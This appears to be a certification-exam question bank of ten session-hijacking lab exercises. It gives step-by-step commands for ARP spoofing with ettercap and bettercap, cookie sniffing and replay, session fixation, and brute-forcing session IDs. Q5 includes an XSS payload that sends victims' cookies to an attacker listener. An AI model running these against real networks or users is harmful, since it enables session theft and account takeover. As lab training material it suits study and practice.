# Question Bank — Session Hijacking (10 questions)

> Cookie theft, replay, fixation, CSRF, and XSS-to-cookie attacks. Steps link into per-tool docs — click any command to read what it does.

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Capture a session cookie travelling between 10.10.10.5 and 10.10.10.20 via ARP MITM

**Category:** Cookie sniffing | **Tools:** [ettercap](../../tools/ettercap.md), [wireshark](../../tools/wireshark.md)

**Steps:**
1. Enable IP forwarding: `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`
2. ARP spoof both sides:
   ```bash
   sudo ettercap -T -M arp:remote /10.10.10.5// /10.10.10.20//
   ```
   ← [why ettercap](../../tools/ettercap.md#mitm-modes)
3. Start [wireshark](../../tools/wireshark.md) on `eth0` with filter `http.cookie`.
4. When the victim logs in, grab `Cookie: PHPSESSID=...`.

**Answer format:** the session cookie value (e.g. `PHPSESSID=a1b2c3...`)

**Gotcha:** HTTPS sessions aren't sniffable without SSLstrip / cert tricks — only raw HTTP leaks the cookie.

---

### Q2 🟢 — Replay a captured cookie `PHPSESSID=abc123` with curl against 10.10.10.20

**Category:** Cookie replay | **Tools:** [curl](../../tools/curl.md)

**Steps:**
1. `curl -b "PHPSESSID=abc123" http://10.10.10.20/dashboard.php` ← [why -b](../../tools/curl.md#cookies)
2. Or with full header: `curl -H "Cookie: PHPSESSID=abc123" http://10.10.10.20/dashboard.php`
3. Check response — authenticated page = success.

**Answer format:** authenticated page content or username shown.

**Gotcha:** if the app binds the session to source IP or User-Agent, plain replay fails — mimic the victim's UA with `-A`.

---

### Q3 🟡 — Replay a captured cookie via Burp Repeater

**Category:** Cookie replay | **Tools:** [burp](../../tools/burpsuite.md)

**Steps:**
1. Open [Burp Suite](../../tools/burpsuite.md#repeater) → Proxy → intercept an unauthenticated request to the target.
2. Send to Repeater (`Ctrl+R`).
3. Add header: `Cookie: PHPSESSID=abc123`
4. `Send` — observe the authenticated response.

**Answer format:** HTTP status + page title from the response tab.

---

### Q4 🟡 — Perform a session fixation attack against 10.10.10.20

**Category:** Fixation | **Tools:** [curl](../../tools/curl.md), [burp](../../tools/burpsuite.md)

**Steps:**
1. As attacker, visit the login page and receive a session cookie: `curl -c atk.txt http://10.10.10.20/login.php`
2. Read `atk.txt` → note `PHPSESSID=xyz999`.
3. Trick the victim into visiting `http://10.10.10.20/login.php?PHPSESSID=xyz999` (URL-injected ID).
4. After the victim logs in, reuse `PHPSESSID=xyz999` from your browser/[curl](../../tools/curl.md#cookies).

**Answer format:** proof of authenticated access with the pre-set cookie.

**Gotcha:** only works if the app accepts session IDs from the URL AND doesn't regenerate the ID at login. Modern frameworks regenerate — check.

---

### Q5 🟡 — Craft an XSS payload that steals `document.cookie` and sends it to 10.10.10.100

**Category:** XSS → cookie theft | **Tools:** `nc`, browser

**Steps:**
1. On attacker: `nc -nlvp 8080`
2. Inject payload into a vulnerable parameter:
   ```html
   <script>new Image().src="http://10.10.10.100:8080/?c="+document.cookie</script>
   ```
3. When the victim loads the XSS-rendering page, nc prints the GET with the cookie appended.
4. Replay the cookie (see Q2/Q3).

**Answer format:** captured cookie (e.g. `PHPSESSID=victim123`)

**Gotcha:** `HttpOnly` cookies are invisible to JavaScript — this attack silently fails. Check the cookie's `HttpOnly` flag first.

---

### Q6 🟢 — Identify the CSRF token field in a POST request captured in Burp

**Category:** CSRF recon | **Tools:** [burp](../../tools/burpsuite.md)

**Steps:**
1. In [Burp Proxy](../../tools/burpsuite.md#proxy), capture a form-submit request.
2. Inspect the POST body for fields named `csrf_token`, `authenticity_token`, `__RequestVerificationToken`, `_csrf`, `nonce`.
3. Or check a hidden form field in the prior GET.

**Answer format:** the token parameter name (e.g. `csrf_token`)

---

### Q7 🟡 — Generate a CSRF Proof-of-Concept HTML page from a captured request in Burp

**Category:** CSRF PoC | **Tools:** [burp](../../tools/burpsuite.md)

**Steps:**
1. In Burp (Pro), right-click the request → `Engagement tools` → `Generate CSRF PoC`. ← [why](../../tools/burpsuite.md#csrf-poc)
2. Copy the generated HTML and save as `csrf.html`.
3. Host it: `python3 -m http.server 8000` and send the victim `http://10.10.10.100:8000/csrf.html`.

**Answer format:** the generated HTML (especially the hidden form fields).

**Gotcha:** if the request has a CSRF token, the PoC won't succeed — you need to also bypass or steal the token via XSS first.

---

### Q8 🔴 — Hijack a session that uses predictable incrementing session IDs

**Category:** Weak session ID | **Tools:** [burp](../../tools/burpsuite.md), [curl](../../tools/curl.md)

**Steps:**
1. Log in as attacker → observe your ID (e.g. `SID=1045`).
2. Log in again → `SID=1046`. Confirm pattern.
3. Enumerate nearby IDs with Burp Intruder or:
   ```bash
   for i in $(seq 1000 1100); do
     curl -s -o /dev/null -w "%{http_code} $i\n" -b "SID=$i" http://10.10.10.20/dashboard.php
   done
   ```
4. Any `200` response (vs a redirect to login) = hijacked session.

**Answer format:** the hijacked SID value + associated username.

**Gotcha:** frameworks since ~2010 use cryptographically random IDs — this only works on homegrown apps. CEH labs often use them.

---

### Q9 🟡 — Use Burp Sequencer to test session token randomness

**Category:** Session strength | **Tools:** [burp](../../tools/burpsuite.md)

**Steps:**
1. Capture a login response containing `Set-Cookie: SID=...`.
2. Send to [Burp Sequencer](../../tools/burpsuite.md#sequencer).
3. Select the cookie token → `Start live capture` (needs ~200 samples).
4. Read the entropy estimate in bits.

**Answer format:** entropy value (e.g. `~80 bits`) and verdict (`excellent` / `poor`).

**Gotcha:** this is a Burp Pro feature — the free Community edition disables Sequencer. On exam Parrot, confirm you have the right edition.

---

### Q10 🔴 — Perform a full session hijack with bettercap (ARP + HTTP proxy + cookie dump)

**Category:** All-in-one MITM | **Tools:** [bettercap](../../tools/bettercap.md)

**Steps:**
1. `sudo bettercap -iface eth0` ← [why](../../tools/bettercap.md#usage)
2. Inside the bettercap shell:
   ```
   set arp.spoof.targets 10.10.10.5
   arp.spoof on
   set http.proxy.script cookie.js
   http.proxy on
   net.sniff on
   ```
3. `cookie.js` logs all `Set-Cookie` headers — inspect output.
4. Replay captured cookies with [curl](../../tools/curl.md) (see Q2).

**Answer format:** captured cookie + successful authenticated request.

**Gotcha:** bettercap needs `net.probe on` first if the target isn't already in the ARP cache, otherwise `arp.spoof` has nothing to poison.

---

## 📌 Quick links

- [burp](../../tools/burpsuite.md) · [ettercap](../../tools/ettercap.md) · [bettercap](../../tools/bettercap.md) · [wireshark](../../tools/wireshark.md) · [curl](../../tools/curl.md)
- [Session hijacking playbook](../../playbooks/session-hijacking-playbook.md)
- [10-session-hijacking README](../../10-session-hijacking/README.md)
